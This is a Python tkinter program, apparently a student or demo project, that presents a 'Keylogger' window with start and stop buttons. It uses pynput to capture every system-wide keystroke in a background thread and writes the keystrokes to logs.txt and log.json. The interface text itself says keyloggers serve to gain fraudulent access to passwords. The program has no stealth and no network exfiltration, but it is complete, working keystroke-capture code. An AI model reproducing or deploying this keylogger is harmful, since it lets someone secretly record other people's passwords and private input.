import tkinter as tk
from tkinter import ttk
import json
import threading
import time
from pynput import keyboard
from PIL import Image, ImageTk

# Create the main window
root = tk.Tk()
root.geometry("615x470")
root.title("Keylogger Page")
root.iconphoto(True, tk.PhotoImage(file="icon.png"))

#Disable maximizing the window
root.resizable(False, False)

# Load the background image
background_image = Image.open("logo.png")
background_image = background_image.resize((615, 470))
background_photo = ImageTk.PhotoImage(background_image)

# Create a label to display the background image
background_label = tk.Label(root, image=background_photo)
background_label.place(x=0, y=0, relwidth=1, relheight=1)

# List to store the captured key events
key_list = []
x = False
key_strokes = ""
is_running = False  # Variable to control keylogger loop
listener = None

# Function to update the text file with key strokes
def update_txt_file(key):
    with open('logs.txt', 'w+') as key_stroke:
        key_stroke.write(key)

# Function to update the JSON file with key events
def update_json_file(key_list):
    with open('log.json', 'w+') as key_log:
        key_list_bytes = json.dumps(key_list).encode()
        key_log.write(key_list_bytes.decode())

# Function called when a key is pressed
def on_press(key):
    global x, key_list
    if x == False:
        key_list.append({'Pressed': f'{key}'})
        x = True
    if x == True:
        key_list.append({'Held': f'{key}'})
    update_json_file(key_list)

# Function called when a key is released
def on_release(key):
    global x, key_list, key_strokes
    key_list.append({'Released': f'{key}'})
    if x == True:
        x = False
    update_json_file(key_list)

    key_strokes = key_strokes + str(key)
    update_txt_file(str(key_strokes))

# Function to start the keylogger
def start_keylogger():
    global is_running, listener
    is_running = True
    print("[+] Running Keylogger Successfully!\n[!] Saving the key logs in 'log.json'")
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()

    while is_running:
        time.sleep(0.1)  # Sleep for a short duration
    listener.stop()  # Stop the listener
    print("Keylogger stopped working!")

# Function to stop the keylogger
def stop_keylogger():
    global is_running
    is_running = False

# Function to run the keylogger in the background
def run_keylogger():
    thread = threading.Thread(target=start_keylogger)
    thread.start()

# GUI elements
empty = tk.Label(root, text="Keylogger", font='Arial 15 bold',  bg="grey", fg="white")
empty.pack(pady=(20, 20))


#Start Key Logger 

empty = tk.Label(root, text="  Keylogger is a computer program that records every keystroke made by a computer user,         ", font='Cambria 11', bg="black", fg="White")
empty.pack()
empty = tk.Label(root, text=" especially in order to gain fraudulent access to passwords and other confidential information. ", font='Cambria 11', bg="black", fg="white")
empty.pack()
empty = tk.Label(root, text=" This is activity-monitoring software programs that give hackers access to your personal data.  ", font='Cambria 11', bg="black", fg="white")
empty.pack(pady=(0, 30))
empty = tk.Label(root, text=" CLICK HERE to start: ", font='Arial 8', bg="#071943", fg="yellow")
empty.pack(pady=0)

# Create a style for rounded buttons with dark background colors
style = ttk.Style()
style.configure("RoundedButton.TButton", relief="rounded", foreground="black", font='Arial 10 bold')
style.map("RoundedButton.TButton", background=[('active', '!disabled', '!focus', '#4C4C4C'), ('!disabled', '!focus', '#2B2B2B')])

start_button = ttk.Button(root, text="START KEYLOGGER", command=run_keylogger, style="RoundedButton.TButton")
start_button.pack(pady=(0,20))

empty = tk.Label(root, text=" CLICK HERE to stop: ", font='Arial 8', bg="#071943", fg="yellow")
empty.pack(pady=0)

stop_button = ttk.Button(root, text=" STOP KEYLOGGER ", command=stop_keylogger, style="RoundedButton.TButton")
stop_button.pack(pady=(0,20))

# Center-align the window contents when maximized
root.pack_propagate(False)
root.mainloop()
